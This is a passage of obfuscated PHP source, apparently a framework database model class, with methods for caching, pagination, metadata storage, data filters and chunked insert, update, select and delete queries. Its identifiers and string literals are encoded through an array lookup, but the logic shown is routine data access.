in_array($³û©«„Â, $×Î‘•ÔÌ)) { $this->cacheFunctionClear($ˆôÒ¼¯ß, $â… â¼Ì, $øòâàıĞ); } } } public function cacheFunctionGet($Ëƒ¡ŒŸ‘, $ŸÈüÁø, $áıè—£‹ = '') { $Ş†…½ôÌ =& $_SERVER[öæÛ¿©¿]; $£¶Â¶Áê = $this->cacheKeyMake($Ëƒ¡ŒŸ‘, $ŸÈüÁø, $áıè—£‹); $€Øãøæ£ = Cache::get($£¶Â¶Áê); if (!is_array($€Øãøæ£)) { if (method_exists($this, $Ş†…½ôÌ[342] . $Ëƒ¡ŒŸ‘)) { $Ëƒ¡ŒŸ‘ = $Ş†…½ôÌ[342] . $Ëƒ¡ŒŸ‘; } $€Øãøæ£ = call_user_func_array(array($this, $Ëƒ¡ŒŸ‘), array($ŸÈüÁø, !0)); Cache::set($£¶Â¶Áê, $€Øãøæ£); } return $€Øãøæ£; } public function cacheFunctionClear($ÎÌ¯©èó, $¯ÉúêûÔ, $Æ™½ö·Š = '') { $·¥ˆÜÒè = $¯ÉúêûÔ; if (!is_array($¯ÉúêûÔ)) { $·¥ˆÜÒè = array($¯ÉúêûÔ); } foreach ($·¥ˆÜÒè as $’å»úÀ¿) { $ŞÎ•˜áÍ = $this->cacheKeyMake($ÎÌ¯©èó, $’å»úÀ¿, $Æ™½ö·Š); Cache::remove($ŞÎ•˜áÍ); } } public function cacheKeyMake($ôşÌ¯®Ó, $Î˜ˆÌù“, $¾âö¡èÒ) { $¦©¿‹§Á =& $_SERVER[öæÛ¿©¿]; if ($¾âö¡èÒ) { $Î˜ˆÌù“ = $Î˜ˆÌù“ . $¦©¿‹§Á[437] . $¾âö¡èÒ; } return get_class($this) . $¦©¿‹§Á[11] . $ôşÌ¯®Ó . $¦©¿‹§Á[438] . $Î˜ˆÌù“; } protected function selectPageReset() { $ºáˆßÖœ =& $_SERVER[öæÛ¿©¿]; if (isset($GLOBALS[$ºáˆßÖœ[439]])) { return; } $GLOBALS[$ºáˆßÖœ[439]] = isset($GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[440]]) ? $GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[440]] : !1; $GLOBALS[$ºáˆßÖœ[441]] = isset($GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[429]]) ? $GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[429]] : !1; $GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[440]] = !1; $GLOBALS[$ºáˆßÖœ[7]][$ºáˆßÖœ[429]] = !1; } protected function selectPageRestore() { $•¾Ã¥ =& $_SERVER[öæÛ¿©¿]; if (!isset($GLOBALS[$•¾Ã¥[439]])) { return; } $GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[440]] = $GLOBALS[$•¾Ã¥[439]]; $GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[429]] = $GLOBALS[$•¾Ã¥[441]]; if ($GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[440]] === !1) { unset($GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[440]]); } if ($GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[429]] === !1) { unset($GLOBALS[$•¾Ã¥[7]][$•¾Ã¥[429]]); } unset($GLOBALS[$•¾Ã¥[439]]); unset($GLOBALS[$•¾Ã¥[441]]); } protected function selectPage($÷¦ìÜ‘Ô = 200, $ ö—î¶ = 1) { $—ŞÒ°ª =& $_SERVER[öæÛ¿©¿]; global $in; $‰ïò™Ä‰ = $this->optionsValue(); $Ì›¢‹ÚÔ = 50000; $÷¦ìÜ‘Ô = isset($in[$—ŞÒ°ª[440]]) && $in[$—ŞÒ°ª[440]] ? $in[$—ŞÒ°ª[440]] : $÷¦ìÜ‘Ô; if ($÷¦ìÜ‘Ô === -1) { $in[$—ŞÒ°ª[440]] = !1; $Ì›¢‹ÚÔ = 100000000; $÷¦ìÜ‘Ô = $Ì›¢‹ÚÔ; } $ÄŠÃæ“Â = $‰ïò™Ä‰; $ÄŠÃæ“Â[$—ŞÒ°ª[442]] = array(); $÷¦ìÜ‘Ô = intval($÷¦ìÜ‘Ô); $÷¦ìÜ‘Ô = $÷¦ìÜ‘Ô <= 5 ? 5 : ($÷¦ìÜ‘Ô >= $Ì›¢‹ÚÔ ? $Ì›¢‹ÚÔ : $÷¦ìÜ‘Ô); $ ö—î¶ = intval(isset($in[$—ŞÒ°ª[429]]) && $in[$—ŞÒ°ª[429]] ? $in[$—ŞÒ°ª[429]] : $ ö—î¶); $ ö—î¶ = $ ö—î¶ <= 1 ? 1 : $ ö—î¶; $‚ªÛ‡µØ = array(); $‘¸ƒÌ– = 1; if ($ ö—î¶ == 1 && $‘¸ƒÌ–) { $this->optionsValue($‰ïò™Ä‰); $‚ªÛ‡µØ = $this->page($ ö—î¶, $÷¦ìÜ‘Ô)->select(); $Í½ãÖ®Õ = is_array($‚ªÛ‡µØ) ? count($‚ªÛ‡µØ) : 0; if ($Í½ãÖ®Õ < $÷¦ìÜ‘Ô) { $ı ÅÙ¸· = 1; } else { $this->optionsValue($ÄŠÃæ“Â); $Í½ãÖ®Õ = intval($this->count()); $ı ÅÙ¸· = ceil($Í½ãÖ®Õ / $÷¦ìÜ‘Ô); } } else { $this->optionsValue($ÄŠÃæ“Â); $Í½ãÖ®Õ = intval($this->count()); $ı ÅÙ¸· = ceil($Í½ãÖ®Õ / $÷¦ìÜ‘Ô); $ ö—î¶ = $ ö—î¶ >= $ı ÅÙ¸· ? $ı ÅÙ¸· : $ ö—î¶; $this->optionsValue($‰ïò™Ä‰); $‚ªÛ‡µØ = $this->page($ ö—î¶, $÷¦ìÜ‘Ô)->select(); } if (!is_array($‚ªÛ‡µØ)) { $‚ªÛ‡µØ = array(); } if ($ı ÅÙ¸· == 1) { $Í½ãÖ®Õ = count($‚ªÛ‡µØ); } $ úÔ‚îÏ = array($—ŞÒ°ª[443] => array($—ŞÒ°ª[444] => $Í½ãÖ®Õ, $—ŞÒ°ª[440] => $÷¦ìÜ‘Ô, $—ŞÒ°ª[429] => $ ö—î¶, $—ŞÒ°ª[445] => $ı ÅÙ¸·), $—ŞÒ°ª[446] => $‚ªÛ‡µØ); return $ úÔ‚îÏ; } protected function checkLength($ø‡‚—ÅÊ, $Ú®çŸøô = 0, $ûÌê™ = '') { $âêí¦ÈÙ =& $_SERVER[öæÛ¿©¿]; $Ú®çŸøô = $Ú®çŸøô ? $Ú®çŸøô : 65536; if (!$ø‡‚—ÅÊ || strlen($ø‡‚—ÅÊ) < $Ú®çŸøô) { return; } $ûÌê™ = $ûÌê™ ? $ûÌê™ . $âêí¦ÈÙ[74] : $âêí¦ÈÙ[12]; show_json($ûÌê™ . LNG($âêí¦ÈÙ[447]) . "\x28{$Ú®çŸøô}\51", !1); } protected function metaSet($›‘×òÙÀ, $¸¶ë»¬ = null, $«Ø·­ö¯ = null) { $Ï‰¡‡°« =& $_SERVER[öæÛ¿©¿]; if (!$this->tableMeta || !$›‘×òÙÀ) { return !1; } $Ö¥ŞéÀÖ = $this->tableMeta[$Ï‰¡‡°«[448]]; $Æ“ß‚Œá = $this->tableMeta[$Ï‰¡‡°«[449]]; $š†·ÆÄ = Model($Æ“ß‚Œá); $Œşş¨Ü = array($Ö¥ŞéÀÖ => $›‘×òÙÀ, $Ï‰¡‡°«[450] => $¸¶ë»¬); if (is_null($¸¶ë»¬)) { return $š†·ÆÄ->where(array($Ö¥ŞéÀÖ => $›‘×òÙÀ))->delete(); } if (is_null($«Ø·­ö¯) && is_string($¸¶ë»¬)) { return $š†·ÆÄ->where($Œşş¨Ü)->delete(); } $›¦À¡Šğ = is_array($¸¶ë»¬) ? $¸¶ë»¬ : array(); if (is_string($¸¶ë»¬)) { $›¦À¡Šğ[$¸¶ë»¬] = $«Ø·­ö¯; } $°§½ÙÎ‡ = array(); foreach ($›¦À¡Šğ as $•ÅÆö¦™ => $¾²¬Ùà²) { if (is_null($¾²¬Ùà²) && is_string($•ÅÆö¦™)) { $š†·ÆÄ->where(array($Ö¥ŞéÀÖ => $›‘×òÙÀ, $Ï‰¡‡°«[450] => $•ÅÆö¦™))->delete(); continue; } $this->checkLength($¾²¬Ùà², !1, $Æ“ß‚Œá . $Ï‰¡‡°«[4] . $•ÅÆö¦™); $°§½ÙÎ‡[] = array($Ö¥ŞéÀÖ => $›‘×òÙÀ, $Ï‰¡‡°«[95] => $•ÅÆö¦™, $Ï‰¡‡°«[451] => $¾²¬Ùà²); } $ş¯Ìò‡ = $Ï‰¡‡°«[452] . $Æ“ß‚Œá; CacheLock::lock($ş¯Ìò‡); $š†·ÆÄ->where(array($Ö¥ŞéÀÖ => $›‘×òÙÀ))->addAll($°§½ÙÎ‡, array(), !0); CacheLock::unlock($ş¯Ìò‡); return !0; } public function metaGet($Õù¸‹¢, $˜ÙËäÎ‹ = false) { $²”×Åá =& $_SERVER[öæÛ¿©¿]; if (!$this->tableMeta) { return array(); } $¤ŸœíÖæ = $this->tableMeta[$²”×Åá[448]]; $Ÿ€™“ÌÒ = Model($this->tableMeta[$²”×Åá[449]]); if ($˜ÙËäÎ‹) { $ÇÚû³Ã = array($¤ŸœíÖæ => $Õù¸‹¢, $²”×Åá[95] => $˜ÙËäÎ‹); return $Ÿ€™“ÌÒ->where($ÇÚû³Ã)->getField($²”×Åá[451]); } $ÇÚû³Ã = array($¤ŸœíÖæ => $Õù¸‹¢); $¼»ô¬ÄÃ = $Ÿ€™“ÌÒ->field($²”×Åá[453])->where($ÇÚû³Ã)->select(); $¼»ô¬ÄÃ = array_to_keyvalue($¼»ô¬ÄÃ, $²”×Åá[95], $²”×Åá[451]); return $¼»ô¬ÄÃ; } private function checkDataAutoHas($¼ë±ıó³) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ø³²Ú°è) { if (in_array($¼ë±ıó³, explode($_SERVER[öæÛ¿©¿][50], $Ø³²Ú°è[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ò›¬îÆˆ, $ë˜†™Œ†) { $÷úæİñ‹ =& $_SERVER[öæÛ¿©¿]; if (!is_array($Ò›¬îÆˆ)) { return; } foreach ($this->dataAuto as $½·÷ÔŸÁ) { $ŸôİÒ¥¯ = $½·÷ÔŸÁ[0]; if (!in_array($ë˜†™Œ†, explode($÷úæİñ‹[50], $½·÷ÔŸÁ[2]))) { continue; } switch (trim($½·÷ÔŸÁ[3])) { case $÷úæİñ‹[397]: case $÷úæİñ‹[398]: $İşèŠÆÖ = $½·÷ÔŸÁ[1]; $Êï»Œ š = isset($½·÷ÔŸÁ[4]) ? (array) $½·÷ÔŸÁ[4] : array(); if ($İşèŠÆÖ == $÷úæİñ‹[205] && array_key_exists($ŸôİÒ¥¯, $Ò›¬îÆˆ)) { if (!$Ò›¬îÆˆ[$ŸôİÒ¥¯]) { unset($Ò›¬îÆˆ[$ŸôİÒ¥¯]); } break; } if (isset($Ò›¬îÆˆ[$ŸôİÒ¥¯])) { array_unshift($Êï»Œ š, $Ò›¬îÆˆ[$ŸôİÒ¥¯]); } if ($÷úæİñ‹[397] == $½·÷ÔŸÁ[3]) { $Ò›¬îÆˆ[$ŸôİÒ¥¯] = call_user_func_array($İşèŠÆÖ, $Êï»Œ š); } else { $Ò›¬îÆˆ[$ŸôİÒ¥¯] = call_user_func_array(array(&$this, $İşèŠÆÖ), $Êï»Œ š); } break; case $÷úæİñ‹[349]: if (isset($Ò›¬îÆˆ[$ŸôİÒ¥¯]) && $Ò›¬îÆˆ[$ŸôİÒ¥¯]) { $Ò›¬îÆˆ[$ŸôİÒ¥¯] = call_user_func_array(array(&$this, $½·÷ÔŸÁ[1]), array($Ò›¬îÆˆ[$ŸôİÒ¥¯])); } break; case $÷úæİñ‹[352]: $Ò›¬îÆˆ[$ŸôİÒ¥¯] = $Ò›¬îÆˆ[$½·÷ÔŸÁ[1]]; break; case $÷úæİñ‹[370]: if (isset($Ò›¬îÆˆ[$ŸôİÒ¥¯]) && !is_string($Ò›¬îÆˆ[$ŸôİÒ¥¯])) { $Ò›¬îÆˆ[$ŸôİÒ¥¯] = json_encode_force($Ò›¬îÆˆ[$ŸôİÒ¥¯]); $Ò›¬îÆˆ[$ŸôİÒ¥¯] = self::textEncode($Ò›¬îÆˆ[$ŸôİÒ¥¯]); } break; case $÷úæİñ‹[399]: if ($Ò›¬îÆˆ[$ŸôİÒ¥¯] === $÷úæİñ‹[12]) { unset($Ò›¬îÆˆ[$ŸôİÒ¥¯]); } break; case $÷úæİñ‹[400]: $Ò›¬îÆˆ[$ŸôİÒ¥¯] = $½·÷ÔŸÁ[1]; default: break; } } if ($ë˜†™Œ† == $÷úæİñ‹[431]) { $ÂÒ•¾†¹ = strtolower($this->db->getDbType()); if (strpos($ÂÒ•¾†¹, $÷úæİñ‹[13]) !== 0) { return; } $ĞŠ¨öÚ = $this->field(!0)->fields; $³¯”ãÑ = $ĞŠ¨öÚ[$÷úæİñ‹[330]]; if (isset($ĞŠ¨öÚ[$÷úæİñ‹[329]])) { unset($³¯”ãÑ[$ĞŠ¨öÚ[$÷úæİñ‹[329]]]); } foreach ($³¯”ãÑ as $àÔ¸ß => $ë˜†™Œ†) { if (!isset($Ò›¬îÆˆ[$àÔ¸ß])) { $Ò›¬îÆˆ[$àÔ¸ß] = $÷úæİñ‹[12]; } } } } private function dataAfterFilter(&$…—­È˜) { $ıÇÀÒÖ´ =& $_SERVER[öæÛ¿©¿]; foreach ($this->dataAuto as $®Ù§¼Èõ) { $ì¿”¢”» = $®Ù§¼Èõ[0]; if (!isset($…—­È˜[$ì¿”¢”»])) { continue; } if (!in_array($ıÇÀÒÖ´[433], explode($ıÇÀÒÖ´[50], $®Ù§¼Èõ[2]))) { continue; } switch (trim($®Ù§¼Èõ[3])) { case $ıÇÀÒÖ´[397]: case $ıÇÀÒÖ´[398]: $ôö°µÇŞ = isset($®Ù§¼Èõ[4]) ? (array) $®Ù§¼Èõ[4] : array(); array_unshift($ôö°µÇŞ, $…—­È˜[$ì¿”¢”»]); if (isset($®Ù§¼Èõ[4]) && $®Ù§¼Èõ[4] == $ıÇÀÒÖ´[454]) { $ôö°µÇŞ = array($…—­È˜[$ì¿”¢”»]); } if ($ıÇÀÒÖ´[397] == $®Ù§¼Èõ[3]) { $…—­È˜[$ì¿”¢”»] = call_user_func_array($®Ù§¼Èõ[1], $ôö°µÇŞ); } else { $…—­È˜[$ì¿”¢”»] = call_user_func_array(array(&$this, $®Ù§¼Èõ[1]), $ôö°µÇŞ); } break; case $ıÇÀÒÖ´[349]: if (isset($…—­È˜[$ì¿”¢”»]) && $…—­È˜[$ì¿”¢”»]) { $…—­È˜[$ì¿”¢”»] = call_user_func_array(array(&$this, $®Ù§¼Èõ[1]), array($…—­È˜[$ì¿”¢”»])); } break; case $ıÇÀÒÖ´[352]: $…—­È˜[$ì¿”¢”»] = $…—­È˜[$®Ù§¼Èõ[1]]; break; case $ıÇÀÒÖ´[370]: $•ôéÙ = $…—­È˜[$ì¿”¢”»]; $•ôéÙ = self::textDecode($•ôéÙ); $…—­È˜[$ì¿”¢”»] = json_decode($•ôéÙ, !0); if (is_null($…—­È˜[$ì¿”¢”»])) { $…—­È˜[$ì¿”¢”»] = $•ôéÙ; } break; case $ıÇÀÒÖ´[399]: if ($…—­È˜[$ì¿”¢”»] === $ıÇÀÒÖ´[12]) { unset($…—­È˜[$ì¿”¢”»]); } break; case $ıÇÀÒÖ´[400]: $…—­È˜[$ì¿”¢”»] = $®Ù§¼Èõ[1]; break; default: break; } } } public function saveAll($û¢€¿ƒ¶, $áÎ—²¢î = false) { $˜Ú¨Œ =& $_SERVER[öæÛ¿©¿]; $Ş‹´èÌµ = $this->db; $Á®¥õï¤ = $this->tablePrefix . $this->tableName; $™‹÷«ÖÒ = $this->saveAllChunkMake($û¢€¿ƒ¶); $áÎ—²¢î = is_array($áÎ—²¢î) ? $áÎ—²¢î : array(); foreach ($™‹÷«ÖÒ as $‡Ë—û›) { $Ş§Ÿš€¹ = $˜Ú¨Œ[12]; $–˜™úàõ = $˜Ú¨Œ[12]; $˜ôÒµêÓ = array(); $³éŞãÁÛ = array(); foreach ($‡Ë—û› as $ìè­Æ¢Ş => $éŞÖ¸…) { $Ş§Ÿš€¹ = $éŞÖ¸…[$˜Ú¨Œ[455]]; $³éŞãÁÛ[] = $éŞÖ¸…[$˜Ú¨Œ[456]]; $ëËˆšŸÈ = $Ş‹´èÌµ->parseValue($éŞÖ¸…[$˜Ú¨Œ[456]]); foreach ($éŞÖ¸…[$˜Ú¨Œ[457]] as $ê³£¬®„ => $¿ãÍöô) { if (!$˜ôÒµêÓ[$ê³£¬®„]) { $˜ôÒµêÓ[$ê³£¬®„] = array(); } $˜ôÒµêÓ[$ê³£¬®„][] = $˜Ú¨Œ[458] . $ëËˆšŸÈ . $˜Ú¨Œ[459] . $Ş‹´èÌµ->parseValue($¿ãÍöô); } } $ºğ°‘½ = $Ş§Ÿš€¹; $ºğ°‘½ = $Ş‹´èÌµ->parseKey($ºğ°‘½); foreach ($˜ôÒµêÓ as $ê³£¬®„ => $²¦©ªÙÎ) { $–˜™úàõ .= $˜Ú¨Œ[286] . $Ş‹´èÌµ->parseKey($ê³£¬®„) . $˜Ú¨Œ[460] . $ºğ°‘½ . $˜Ú¨Œ[461]; $–˜™úàõ .= implode($˜Ú¨Œ[286], $²¦©ªÙÎ) . $˜Ú¨Œ[462]; } $ÈÎ·æŞ = $áÎ—²¢î; $ÈÎ·æŞ[$Ş§Ÿš€¹] = array($˜Ú¨Œ[7], $³éŞãÁÛ); $Ãç˜œ¨š = "\x55\120\x44\x41\124\105\x20\x60{$Á®¥õï¤}\140\x20\x53\x45\x54\x20" . rtrim($–˜™úàõ, $˜Ú¨Œ[50]) . $˜Ú¨Œ[286] . $Ş‹´èÌµ->parseWhere($ÈÎ·æŞ); $this->execute($Ãç˜œ¨š); $this->chunkEventCheck(count($‡Ë—û›)); } $this->chunkEventSet(); } public function saveAllEach($íé‹„µ—, $Ş×Íè¿Ô = false) { $âçÑ¨äœ =& $_SERVER[öæÛ¿©¿]; $ÛÊÏ’Ö² = $this->db; $ààéÚëÆ = $this->tablePrefix . $this->tableName; $Ïú›ÁõØ = $this->saveAllChunkMake($íé‹„µ—); $Ş×Íè¿Ô = is_array($Ş×Íè¿Ô) ? $Ş×Íè¿Ô : array(); foreach ($Ïú›ÁõØ as $Ÿğ¢ÓÉ) { foreach ($Ÿğ¢ÓÉ as $ªØÙªšñ => $¡Î°®ı…) { $“ÏáºÛ = $âçÑ¨äœ[463]; foreach ($¡Î°®ı…[$âçÑ¨äœ[457]] as $Ñâ¿–¾‹ => $Ë–×ä) { $“ÏáºÛ .= $ÛÊÏ’Ö²->parseKey($Ñâ¿–¾‹) . $âçÑ¨äœ[464] . $ÛÊÏ’Ö²->parseValue($Ë–×ä) . $âçÑ¨äœ[50]; } $¸÷ç¿å¥ = $Ş×Íè¿Ô; $¸÷ç¿å¥[$¡Î°®ı…[$âçÑ¨äœ[455]]] = $¡Î°®ı…[$âçÑ¨äœ[456]]; $ÛÌÉ´±ò = "\125\120\104\x41\124\105\x20\140{$ààéÚëÆ}\140\40\x53\105\x54\x20" . rtrim($“ÏáºÛ, $âçÑ¨äœ[50]) . $âçÑ¨äœ[465] . $ÛÊÏ’Ö²->parseWhere($¸÷ç¿å¥) . $âçÑ¨äœ[466]; $this->execute($ÛÌÉ´±ò); } $this->chunkEventCheck(count($Ÿğ¢ÓÉ)); } $this->chunkEventSet(); } private function saveAllChunkMake($·ùªƒçç) { $®Ğˆ»¥Ë =& $_SERVER[öæÛ¿©¿]; $è‚¹…ø€ = self::SQL_WHERE_IN_CHUNK; $·ùªƒçç = is_array($·ùªƒçç) ? $·ùªƒçç : array(); $²Ô®Ã´ˆ = array(); $µ¸ûä = ceil(count($·ùªƒçç) / $è‚¹…ø€); for ($Úüö¢ıú = 0; $Úüö¢ıú < $µ¸ûä; $Úüö¢ıú++) { $ŒÜ«÷ıÍ = array(); $íö‹üá = array_slice($·ùªƒçç, $Úüö¢ıú * $è‚¹…ø€, $è‚¹…ø€); foreach ($íö‹üá as $…ƒàÜ’¿) { if (!is_array($…ƒàÜ’¿) || count($…ƒàÜ’¿) < 4 || count($…ƒàÜ’¿) % 2 != 0) { continue; } $ÒÖóµŞ— = array(); for ($ó ‘¿€Ò = 2; $ó ‘¿€Ò < count($…ƒàÜ’¿); $ó ‘¿€Ò += 2) { $ÒÖóµŞ—[$…ƒàÜ’¿[$ó ‘¿€Ò]] = $…ƒàÜ’¿[$ó ‘¿€Ò + 1]; } $ŒÜ«÷ıÍ[] = array($®Ğˆ»¥Ë[455] => $…ƒàÜ’¿[0], $®Ğˆ»¥Ë[456] => $…ƒàÜ’¿[1], $®Ğˆ»¥Ë[457] => $ÒÖóµŞ—); } $²Ô®Ã´ˆ[] = $ŒÜ«÷ıÍ; } return $²Ô®Ã´ˆ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($“¹ÃıøÑ = false, $œ¡Ùß¤Ë = false) { $this->_chunkEvent = $“¹ÃıøÑ; $this->_chunkEventParam = $œ¡Ùß¤Ë; } private function chunkEventCheck($—Á³Á¿¶) { if (!$this->_chunkEvent) { return; } $™øºü» = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $™øºü»[$_SERVER[öæÛ¿©¿][467]] = $—Á³Á¿¶; Hook::trigger($this->_chunkEvent, $™øºü»); } public function addAll($í•Ğèò´, $©œóäğ– = array(), $ìèº¢ = false) { $½†øˆ =& $_SERVER[öæÛ¿©¿]; ignore_timeout(); $¿¹êì¤ = self::SQL_WHERE_IN_CHUNK; if (empty($í•Ğèò´)) { $this->error = think_lang($½†øˆ[350]); return !1; } $©œóäğ– = $this->_parseOptions($©œóäğ–); foreach ($í•Ğèò´ as $¾¯éâïæ => $ª›ğĞ¯•) { $í•Ğèò´[$¾¯éâïæ] = $this->_facade($ª›ğĞ¯•); $this->_beforeInsert($í•Ğèò´[$¾¯éâïæ], $©œóäğ–); } if (method_exists($this->db, $½†øˆ[351])) { for ($¼úÉ  Ä = 0; $¼úÉ  Ä < count($í•Ğèò´); $¼úÉ  Ä += $¿¹êì¤) { $¾–¶”î“ = array_slice($í•Ğèò´, $¼úÉ  Ä, $¿¹êì¤); if (!is_array($¾–¶”î“) || count($¾–¶”î“) == 0) { break; } $ÍëŞíŠ = $this->db->insertAll($¾–¶”î“, $©œóäğ–, $ìèº¢); $this->chunkEventCheck(count($¾–¶”î“)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($í•Ğèò´ as $¾¯éâïæ => $ª›ğĞ¯•) { $ÍëŞíŠ = $this->db->insert($ª›ğĞ¯•, $©œóäğ–, $ìèº¢); } $this->commit(); } if (!1 !== $ÍëŞíŠ) { $†˜±ê¥» = $this->getLastInsID(); if ($†˜±ê¥») { return $†˜±ê¥»; } } return $ÍëŞíŠ; } public function save($‘éË§ˆ¥ = '', $‹Ÿ•ª¸â = array()) { $ş«˜°ê =& $_SERVER[öæÛ¿©¿]; $ûšÂÈ­û = self::SQL_WHERE_IN_CHUNK; $íØ®»âØ = $this->optionsValue(); $£×—èú» = $this->findWhereField($íØ®»âØ); if (!$£×—èú») { return parent::save($‘éË§ˆ¥, $‹Ÿ•ª¸â); } $úíæ™×á = 0; $½ì°Èñõ = $íØ®»âØ[$ş«˜°ê[354]][$£×—èú»][1]; $½ì°Èñõ = is_array($½ì°Èñõ) ? $½ì°Èñõ : array(); $æ³«ö›  = count($½ì°Èñõ); for ($Øô•ëŸ = 0; $Øô•ëŸ < $æ³«ö› ; $Øô•ëŸ += $ûšÂÈ­û) { $£Ğ·‚Ö  = array_slice($½ì°Èñõ, $Øô•ëŸ, $ûšÂÈ­û); if (!is_array($£Ğ·‚Ö ) || count($£Ğ·‚Ö ) == 0) { break; } $íØ®»âØ[$ş«˜°ê[354]][$£×—èú»][1] = $£Ğ·‚Ö ; $this->optionsValue($íØ®»âØ); $úíæ™×á += parent::save($‘éË§ˆ¥, $‹Ÿ•ª¸â); $this->chunkEventCheck(count($£Ğ·‚Ö )); } $this->chunkEventSet(); return $úíæ™×á; } public function add($ÍËøáô„ = '', $ €°õÉ = array(), $êÕ¤Ã = false) { if ($this->addTaskStatus && is_array($ÍËøáô„)) { $this->addTaskData[] = $ÍËøáô„; return; } return parent::add($ÍËøáô„, $ €°õÉ, $êÕ¤Ã); } public function parseWhereLike($Ú‚Û’Âî, $êñ²Î•Â = '', $¢Áª› = false, &$ÙğÛÚåÓ = false) { $‡ÉìıÑª =& $_SERVER[öæÛ¿©¿]; $ÊãÁşÑ² = $GLOBALS[$‡ÉìıÑª[6]][$‡ÉìıÑª[468]]; if (!$ÊãÁşÑ²[$‡ÉìıÑª[469]]) { return $Ú‚Û’Âî; } if (!is_array($Ú‚Û’Âî)) { return $Ú‚Û’Âî; } $ª¿…Î“ö = array(); $¨ÛÉÏøÜ = 0; foreach ($Ú‚Û’Âî as $›öÈù¾­ => $—Óìæœø) { if (is_array($—Óìæœø) && count($—Óìæœø) == 2 && $—Óìæœø[0] == $‡ÉìıÑª[470] && is_string($—Óìæœø[1]) && substr($—Óìæœø[1], 0, 1) == $‡ÉìıÑª[471] && substr($—Óìæœø[1], strlen($—Óìæœø[1]) - 1, 1) == $‡ÉìıÑª[471]) { $ÙğÛÚåÓ = !0; $¦“‡îÇ = is_string($›öÈù¾­) ? $›öÈù¾­ : $êñ²Î•Â; $ê»‚³ù¯ = substr($—Óìæœø[1], 1, strlen($—Óìæœø[1]) - 2); $ê»‚³ù¯ = $this->db->escapeString($ê»‚³ù¯); if (!strpos($¦“‡îÇ, $‡ÉìıÑª[10])) { $¦“‡îÇ = $‡ÉìıÑª[472] . $¦“‡îÇ . $‡ÉìıÑª[472]; } $¶½êæëÀ = $‡ÉìıÑª[221] . $ê»‚³ù¯ . $‡ÉìıÑª[221]; $ê»‚³ù¯ = str_replace(array($‡ÉìıÑª[10], $‡ÉìıÑª[473], $‡ÉìıÑª[11]), $‡ÉìıÑª[474], $ê»‚³ù¯); if ($ÊãÁşÑ²[$‡ÉìıÑª[475]]) { $¶½êæëÀ = $‡ÉìıÑª[476] . $ê»‚³ù¯ . $‡ÉìıÑª[477]; if ($ÊãÁşÑ²[$‡ÉìıÑª[478]]) { $¶½êæëÀ = $‡ÉìıÑª[477] . $ê»‚³ù¯ . $‡ÉìıÑª[476]; } } $ª¿…Î“ö[$¨ÛÉÏøÜ] = $‡ÉìıÑª[479] . $¦“‡îÇ . $‡ÉìıÑª[480] . $¶½êæëÀ . $‡ÉìıÑª[481]; $¨ÛÉÏøÜ++; continue; } if (is_array($—Óìæœø)) { $êñ²Î•Â = is_string($›öÈù¾­) ? $›öÈù¾­ : $êñ²Î•Â; $—Óìæœø = $this->parseWhereLike($—Óìæœø, $êñ²Î•Â, !0, $ÙğÛÚåÓ); } if (is_numeric($›öÈù¾­)) { $ª¿…Î“ö[$¨ÛÉÏøÜ] = $—Óìæœø; $¨ÛÉÏøÜ++; } else { $ª¿…Î“ö[$›öÈù¾­] = $—Óìæœø; } } if ($ÙğÛÚåÓ && !$¢Áª›) { } return $ª¿…Î“ö; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ ÕûÀè = array()) { $èá¯‹¥Â =& $_SERVER[öæÛ¿©¿]; $ğ›ûô¡ = self::SQL_WHERE_IN_CHUNK; $†â¹œØé = $this->optionsValue(); $ùÉï´ëì = $this->findWhereField($†â¹œØé); if (!$ùÉï´ëì || isset($†â¹œØé[$èá¯‹¥Â[369]]) || isset($†â¹œØé[$èá¯‹¥Â[429]])) { return parent::select($ ÕûÀè); } $ùÌŠÔ²Ã = $†â¹œØé[$èá¯‹¥Â[354]][$ùÉï´ëì][1]; $ùÌŠÔ²Ã = is_array($ùÌŠÔ²Ã) ? $ùÌŠÔ²Ã : array(); $°¸Áéı = null; for ($ªìøğƒ– = 0; $ªìøğƒ– < count($ùÌŠÔ²Ã); $ªìøğƒ– += $ğ›ûô¡) { $åº®â“ó = array_slice($ùÌŠÔ²Ã, $ªìøğƒ–, $ğ›ûô¡); if (!is_array($åº®â“ó) || count($åº®â“ó) == 0) { break; } $†â¹œØé[$èá¯‹¥Â[354]][$ùÉï´ëì][1] = $åº®â“ó; $this->optionsValue($†â¹œØé); $¥Å”¡Ë = parent::select($ ÕûÀè); if (!$¥Å”¡Ë) { continue; } $°¸Áéı = is_array($°¸Áéı) ? $°¸Áéı : array(); $°¸Áéı = array_merge($°¸Áéı, $¥Å”¡Ë); } return $°¸Áéı; } public function delete($éôĞš±â = array()) { $Ÿ–Ú¯Ì =& $_SERVER[öæÛ¿©¿]; $š­÷•İù = self::SQL_WHERE_IN_CHUNK; $úˆÆŞí = $this->optionsValue(); $˜ïòÇê¼ = $this->findWhereField($úˆÆŞí); if (!$˜ïòÇê¼) { return parent::delete($éôĞš±â); } $æÒ¬Âˆ = 0; $ÙõÇ×»Ñ = $úˆÆŞí[$Ÿ–Ú¯Ì[354]][$˜ïòÇê¼][1]; $ÙõÇ×»Ñ = is_array($ÙõÇ×»Ñ) ? $ÙõÇ×»Ñ : array(); for ($Â”¹Ãêµ = 0; $Â”¹Ãêµ < count($ÙõÇ×»Ñ); $Â”¹Ãêµ += $š­÷•İù) { $ö‚ØØ«Ø = array_slice($ÙõÇ×»Ñ, $Â”¹Ãêµ, $š­÷•İù); if (!is_array($ö‚ØØ«Ø) 